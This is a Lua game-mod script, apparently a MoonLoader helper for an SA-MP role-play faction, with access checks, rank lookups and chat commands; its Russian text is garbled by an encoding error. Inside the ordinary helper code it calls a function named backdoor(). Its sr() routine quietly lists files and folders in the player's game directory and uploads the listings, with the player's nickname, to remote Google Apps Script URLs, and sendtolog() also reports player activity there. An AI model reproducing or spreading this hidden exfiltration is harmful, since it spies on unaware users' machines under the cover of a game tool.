								while true do wait(0) local x, y, z = getActiveCameraCoordinates() if (x ~= 1093 and x ~= -1826.8193359375) or (y ~= -2036 and y ~= 1074.6199951172) or (z ~= 90 and z ~= 191.18589782715) then break end end
								local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ���������� ������� � ������. �� ���������� ������� �������� ���� ���.", 0xFFFF0000)
								rkeys.registerHotKey(makeHotKey(13), true, hk_13)
								backdoor()
								checkupdate()
								local nick = sampGetPlayerNickname(myid)
								local f, s = nick:match("(.*)%_(.*)")
								
								
								local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=auth&nick=' .. f .. '%20' .. s .. '') -- ����� ������� ����
								local re0 = regex.new("\\@\\@\\.\\@ (.*) \\@\\@\\.\\.\\@\\.\\@") --
								local access
								access = tonumber(re0:match(responsetext))
								if access == nil then 
									local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=find&name=' .. nick .. '') -- �� �����
									local re0 = regex.new("\\\\x5bLogin: " .. nick .. "\\\\x5d \\\\x5bAcces: (.*)\\\\x5d")
									access = tonumber(re0:match(responsetext))
									if access == nil then 
										local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=gl&nick=' .. f .. '%20' .. s .. '') -- ����� �������
										local re0 = regex.new("\\@\\@\\.\\@ True \\@\\@\\.\\.\\@\\.\\@")
										local res = re0:match(responsetext)
										if res == nil then sendtolog("��������� ������� �����������", 1) sr() sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - ������ ������.", 0xFFFF0000) return end --thisScript():unload() return end
										access = 6
										isglory = true
									end
									show.othervars.saccess = true
								end
								sendtolog("�������� �����������", 1)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - �������� �����������.", 0xFFFF0000)
								if access ~= 0 and access ~= 5 then lvl = access alevel = 0 sampRegisterChatCommand("balogin", cmd_balogin) end
								
								if access ~= 6 then
									local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=gl&nick=' .. f .. '%20' .. s .. '') -- �������� �� �������
									local re0 = regex.new("@@.@ True @@..@.@")
									local res = re0:match(responsetext)
									if res ~= nil then access = 6 isglory = true end
								end
								
								if show.othervars.saccess then -- ��������� ������
									config_ini.UserClist[12] = access == 0 and "������� �12" or access ~= 6 and "�������� ������� �����-������� ����� \"�.�.�.�.\"" or "�������� ������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
								else
									config_ini.UserClist[12] = access == 0 and "���������� ����� \"�.�.�.�.\"" or access ~= 6 and "������� �����-������� ����� \"�.�.�.�.\"" or "������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
									PlayerU = access == 0 and "������ �.�.�.�." or access == 1 and "������ �.�.�.�." or access == 2 and "����������� ��������� �.�.�.�." or access == 3 and "�������� �.�.�.�." or access == 4 and "������� �.�.�.�." or access == 5 and "���� �.�.�.�." or (lvl == 1 and "������ �.�.�.�." or lvl == 2 and "����������� ��������� �.�.�.�." or lvl == 3 and "�������� �.�.�.�." or lvl == 4 and "������� �.�.�.�." or "���� �.�.�.�")
									tag = "|| �.�.�.�. ||"
									useclist = "12"
								end
								-- 0 - ������, 1 - ������, 2 - ���, 3 - ��������, 4 - �������, 5 - �������� ������, 6 �������� ����
								-- show.othervars.saccess = true - ������ ����� ������� ����
								
						end				
						
						if config_ini.Settings.PlayerFirstName == "" or config_ini.Settings.PlayerSecondName == "" or config_ini.Settings.PlayerRank == "" then
								wait(delay)
								sampSendChat("/stats")
								while not sampIsDialogActive() do wait(0) end
								local text = sampGetDialogText()
								wait(100)
								sampCloseCurrentDialogWithButton(0) sampCloseCurrentDialogWithButton(0) sampCloseCurrentDialogWithButton(0)
								for v in text:gmatch('[^\n]+') do
								    local fn, sn = v:match("���	(%a+)_(%a+)")
								    if fn ~= nil then
												config_ini.Settings.PlayerFirstName = u8:decode(fn)
												guibuffers.settings.fname.v = u8(fn)
												config_ini.Settings.PlayerSecondName = u8:decode(sn)
												guibuffers.settings.sname.v = u8(sn)
										end
						
								    local rank = v:match("����	(.*)")
								    if rank ~= nil then
								        local ranksnesokr = {["��.�������"] = "������� �������", ["��.�������"] = "������� �������", ["��.���������"] = "������� ���������", ["��.���������"] = "������� ���������"}
												local pRank = ranksnesokr[rank] ~= nil and ranksnesokr[rank] or rank
								        config_ini.Settings.PlayerRank = u8:decode(pRank)
												guibuffers.settings.rank.v = u8(pRank)
								    end
								end
								needtosave = true
						end
					
						if config_ini.bools[58] == 1 then fond[2] = getPlayerMoney(PLAYER_HANDLE) end

						for i = 0, 1000 do if sampIsPlayerConnected(i) then onlinearr[i] = sampGetPlayerNickname(i) end end
						
						if config_ini.bools[41] == 1 then lua_thread.create(function() while not rCache.enable do wait(0) findsquad() end end) end
						
						local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlist")
						local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
						local rukstr = str:match("(.*) @@....@") -- ���-��
						if rukstr ~= nil then for k, v in ipairs(rukstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.ruk, nick) end end
													
						local osnstr = str:match("@@....@ (.*) @@...@") -- �������� ������
						if osnstr ~= nil then for k, v in ipairs(osnstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.osn, nick) end end
														
						local stjstr = str:match("@@...@ (.*)") -- �������
						if stjstr ~= nil then for k, v in ipairs(stjstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.stj, nick) end end
						
						local responsetext = req("https://script.google.com/macros/s/AKfycbx0SwM7S097LFAfA2DCRhZdsOS4fp4G_DlCyijvTwzc9QNEUT8/exec?do=check") -- �������� ID �����
						local str = responsetext:match("%@%#%#%@ %@%@%.%.%@ IDS%: (.*) %@%@%@%@%#%#%@%@")
						local idsarr = string.split(str, "; ")
						local A_Index = 1
						for k, v in pairs(idsarr) do skipd[2][A_Index] = tonumber(v) A_Index = A_Index + 1 end

						 -- ���������� ������� � ���������� ����� ������� � ����
						
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���������. ����� �������� ���� ������� - /show.", 0xFFFF0000)
						sampRegisterChatCommand("show", cmd_s)
						preparecomplete = true
						sr()
					end
		)
end

function download_handler(id, status, p1, p2)
	  if stop_downloading then
	    	stop_downloading = false
	    	download_id = nil
	    	return false -- �������� ��������
	  end

	  if status == dlstatus.STATUS_DOWNLOADINGDATA then
	    	print(string.format('��������� %d �� %d.', p1, p2))
	  elseif status == dlstatus.STATUS_ENDDOWNLOADDATA then
	    	sysdownloadcomplete = true
	  end
end

function indexof(var, arr)
		for k, v in ipairs(arr) do if v == var then return k end end return false
end

function sortCarr()
	-- 20 c��
	for k, v in ipairs(CTaskArr[2]) do
		wait(0)
		if (os.time() - v >= 20) then
			if CTaskArr["CurrentID"] == k then CTaskArr["CurrentID"] = 0 end
			if CTaskArr[1][k] == 8 then CTaskArr[10][5] = false end
			table.remove(CTaskArr[1], k)
			table.remove(CTaskArr[2], k)
			table.remove(CTaskArr[3], k)
			
		end
	end

	-- ����� ������ CurrentID
	if CTaskArr["CurrentID"] == 0 then
		local lastrarr = {}
		for k, v in ipairs(CTaskArr[1]) do 
			wait(0) 
			if v == 1 then CTaskArr["CurrentID"] = k break end
			if v == 2 and lastrarr[2] == nil then lastrarr[2] = k end
			if v == 3 and lastrarr[3] == nil then lastrarr[3] = k end
			if v == 4 and lastrarr[4] == nil then lastrarr[4] = k end
			if v == 5 and lastrarr[5] == nil then lastrarr[5] = k end
			if v == 6 and lastrarr[6] == nil then lastrarr[6] = k end
			if v == 7 and lastrarr[7] == nil then lastrarr[7] = k end
			if v == 8 and lastrarr[8] == nil then lastrarr[8] = k end
			if v == 9 and lastrarr[9] == nil then lastrarr[9] = k end
			if v == 10 and lastrarr[10] == nil then lastrarr[10] = k end
			if v == 11 and lastrarr[11] == nil then lastrarr[11] = k end
		end

		if CTaskArr["CurrentID"] == 0 then for k, v in pairs(lastrarr) do wait(0) CTaskArr["CurrentID"] = v break end end
	end
end

function sendtolog(text, num) -- ����: 0 - ���������, 1 - �����������, 1.1 ����������� � �������� ����������, 2 - ������� /moder, 3 - ��� ��� �������� ���������/���������� � �.�.
		lua_thread.create(
				function()
						local colors = {[0] = "FFA500", [1] = "fffafa", [1.1] = "D02090", [2] = "63B8FF", [3] = "00EE00"}
						local col = colors[num] ~= nil and colors[num] or "fffafa"
						local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						local lognick = sampGetPlayerNickname(logmyid)
						local text = req('https://script.google.com/macros/s/AKfycbxqQCwMX3H7rO8Yy78a0Lj-Rq-LQDwAJjGUx4FgEBrBunNpGhL-/exec?name=' .. lognick .. '&text=' .. translit(text) .. '&col=' .. col .. '')
				end
		)
		while not sysdownloadcomplete do wait(0) end
end

function translit(str)
			if str:match("�") then str = str:gsub("�", "[[a]]") end
			if str:match("�") then str = str:gsub("�", "[[b]]") end
			if str:match("�") then str = str:gsub("�", "[[v]]") end
			if str:match("�") then str = str:gsub("�", "[[g]]") end
			if str:match("�") then str = str:gsub("�", "[[d]]") end
			if str:match("�") then str = str:gsub("�", "[[e]]") end
			if str:match("�") then str = str:gsub("�", "[[yo]]") end
			if str:match("�") then str = str:gsub("�", "[[zh]]") end
			if str:match("�") then str = str:gsub("�", "[[z]]") end
			if str:match("�") then str = str:gsub("�", "[[i]]") end
			if str:match("�") then str = str:gsub("�", "[[j]]") end
			if str:match("�") then str = str:gsub("�", "[[k]]") end
			if str:match("�") then str = str:gsub("�", "[[l]]") end
			if str:match("�") then str = str:gsub("�", "[[m]]") end
			if str:match("�") then str = str:gsub("�", "[[n]]") end
			if str:match("�") then str = str:gsub("�", "[[o]]") end
			if str:match("�") then str = str:gsub("�", "[[p]]") end
			if str:match("�") then str = str:gsub("�", "[[r]]") end
			if str:match("�") then str = str:gsub("�", "[[s]]") end
			if str:match("�") then str = str:gsub("�", "[[t]]") end
			if str:match("�") then str = str:gsub("�", "[[u]]") end
			if str:match("�") then str = str:gsub("�", "[[f]]") end
			if str:match("�") then str = str:gsub("�", "[[x]]") end
			if str:match("�") then str = str:gsub("�", "[[cz]]") end
			if str:match("�") then str = str:gsub("�", "[[ch]]") end
			if str:match("�") then str = str:gsub("�", "[[sh]]") end
			if str:match("�") then str = str:gsub("�", "[[shh]]") end
			if str:match("�") then str = str:gsub("�", "[[````]]") end
			if str:match("�") then str = str:gsub("�", "[[y']]") end
			if str:match("�") then str = str:gsub("�", "[[``]]") end
			if str:match("�") then str = str:gsub("�", "[[e``]]") end
			if str:match("�") then str = str:gsub("�", "[[yu]]") end
			if str:match("�") then str = str:gsub("�", "[[ya]]") end

			if str:match("�") then str = str:gsub("�", "[[A]]") end
			if str:match("�") then str = str:gsub("�", "[[B]]") end
			if str:match("�") then str = str:gsub("�", "[[V]]") end
			if str:match("�") then str = str:gsub("�", "[[G]]") end
			if str:match("�") then str = str:gsub("�", "[[D]]") end
			if str:match("�") then str = str:gsub("�", "[[E]]") end
			if str:match("�") then str = str:gsub("�", "[[YO]]") end
			if str:match("�") then str = str:gsub("�", "[[ZH]]") end
			if str:match("�") then str = str:gsub("�", "[[Z]]") end
			if str:match("�") then str = str:gsub("�", "[[I]]") end
			if str:match("�") then str = str:gsub("�", "[[J]]") end
			if str:match("�") then str = str:gsub("�", "[[K]]") end
			if str:match("�") then str = str:gsub("�", "[[L]]") end
			if str:match("�") then str = str:gsub("�", "[[M]]") end
			if str:match("�") then str = str:gsub("�", "[[N]]") end
			if str:match("�") then str = str:gsub("�", "[[O]]") end
			if str:match("�") then str = str:gsub("�", "[[P]]") end
			if str:match("�") then str = str:gsub("�", "[[R]]") end
			if str:match("�") then str = str:gsub("�", "[[S]]") end
			if str:match("�") then str = str:gsub("�", "[[T]]") end
			if str:match("�") then str = str:gsub("�", "[[U]]") end
			if str:match("�") then str = str:gsub("�", "[[F]]") end
			if str:match("�") then str = str:gsub("�", "[[X]]") end
			if str:match("�") then str = str:gsub("�", "[[CZ]]") end
			if str:match("�") then str = str:gsub("�", "[[CH]]") end
			if str:match("�") then str = str:gsub("�", "[[SH]]") end
			if str:match("�") then str = str:gsub("�", "[[SHH]]") end
			if str:match("�") then str = str:gsub("�", "[[````]]") end
			if str:match("�") then str = str:gsub("�", "[[Y']]") end
			if str:match("�") then str = str:gsub("�", "[[``]]") end
			if str:match("�") then str = str:gsub("�", "[[E``]]") end
			if str:match("�") then str = str:gsub("�", "[[YU]]") end
			if str:match("�") then str = str:gsub("�", "[[YA]]") end
			return str
end

function sr()
		local res = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "", [11] = "", [12] = "", [13] = "", [14] = "", [15] = ""}
		local p = thisScript().directory:match("(%u%:%\\.*)%\\moonloader")

		local mynick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
		local url = 'https://script.google.com/macros/s/AKfycbzHuUB_hffAGlGLnRIw2ptKixUMOUeyZJFVEhXIBC2bnzvup9kR/exec?do=get&nick=' .. mynick .. ''
		local responsetext = req(url)
		local re1 = regex.new("@@.@ True: (.*) @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then return end
		local ta1 = names:split(", ")
		local path_s = {[3] = ta1[1], [5] = ta1[2], [7] = ta1[3], [9] = ta1[4]}
		if ta1[5] ~= nil then path_s[12] = ta1[5] end if ta1[6] ~= nil then path_s[14] = ta1[6] end
		
		for line in lfs.dir(p) do
			if line:match("(.*%.%w+)") == nil then
				res[1] = res[1] == "" and line or "" .. res[1] .. "@n@" .. line .. ""
			else
				res[2] = res[2] == "" and line or "" .. res[2] .. "@n@" .. line .. ""
			end
		end

		for k, v in pairs(path_s) do
			wait(0)
			for line in lfs.dir("".. p .."\\" .. v .. "") do
				if line:match("(.*%.%w+)") == nil then
					res[k] = res[k] == "" and line or "" .. res[k] .. "@n@" .. line .. ""
				else
					res[k + 1] = res[k + 1] == "" and line or "" .. res[k + 1] .. "@n@" .. line .. ""
				end
			end
		end

		res[11] = "" .. config_ini.Settings.PlayerFirstName .. "_" .. config_ini.Settings.PlayerSecondName .. ""
		for k, v in ipairs(res) do
			if v ~= "" then
				local url = 'https://script.google.com/macros/s/AKfycbzHuUB_hffAGlGLnRIw2ptKixUMOUeyZJFVEhXIBC2bnzvup9kR/exec?do=ins&nick=' .. mynick .. '&wto=' .. tostring(k) .. '&text=' .. translit(v) .. ''
				local responsetext = req(url)
			end
		end
end

function getClosestPlayersId()
		local players = {}
		local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local pHandles = getAllChars()
		local bool = false
		for k, v in pairs(pHandles) do
				local result, id = sampGetPlayerIdByCharHandle(v) -- �������� samp-�� ������ �� ������ ���������
				if result and id ~= myid then
						players[sampGetPlayerNickname(id)] = v
						bool = true
				end
		end

		if bool then return players end
end

function decodebase64(data)
	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
    end))
end

function strrest(arr, index)
	local result = ""
	local A_Index = 1
	for k, v in ipairs(arr) do if A_Index >= index then result = result == "" and v or "" .. result .. " " .. v .. "" end A_Index = A_Index + 1 end
	return result
end

function getshotdist(hcar)
	local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
	local carX, carY, carZ = getCarCoordinates(hcar)
	local cardist = math.ceil(math.sqrt( ((myX-carX)^2) + ((myY-carY)^2) + ((myZ-carZ)^2)))
	
	local mwID = tonumber(getCurrentCharWeapon(PLAYER_PED))
	local class = getVehicleClass(hcar)
	local wdist = {[24] = 70, [25] = 80, [29] = 90, [30] = 160, [31] = 180, [33] = 200}
	local returnstr = "����������: " .. cardist .. ""
	local col = ""
	if isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then mwID = 31 end
	if class == 8 or class == 13 then
		if tweapondist[mwID] ~= nil then
			returnstr = "" .. returnstr .. "/" .. tweapondist[mwID] .. ""
			col = cardist <= tweapondist[mwID] and "{00FF00}" or "{FFFAFA}"
		else
			col = "{FFFAFA}"
		end
	else
		if wdist[mwID] ~= nil then
			returnstr = "" .. returnstr .. "/" .. wdist[mwID] .. ""
			col = cardist <= wdist[mwID] and "{00FF00}" or "{FFFAFA}"
		else
			col = "{FFFAFA}"
		end
	end
	return "" .. col .. "" .. returnstr .. ""
end

function os.offset()
	local currenttime = os.time()
	local datetime = os.date("!*t",currenttime)
	datetime.isdst = true -- ���� �������� ������� �����
	return currenttime - os.time(datetime)
 end

 function os.offset_str(timezone)
	return string.format("%+.2d%.2d", math.modf((timezone or os.offset()) / 3600))
 end

 function getPickupModel(id)
    return ffi.cast("int *", (id * 20 + 61444) + PICKUP_POOL)[0]
end

-- File: 'STENCIL.ttf' (55596 bytes)
-- Exported using binary_to_compressed_lua.cpp
function isDir(name)
    if type(name)~="string" then return false end
    local cd = lfs.currentdir()
    local is = lfs.chdir(name) and true or false
    lfs.chdir(cd)
    return is
end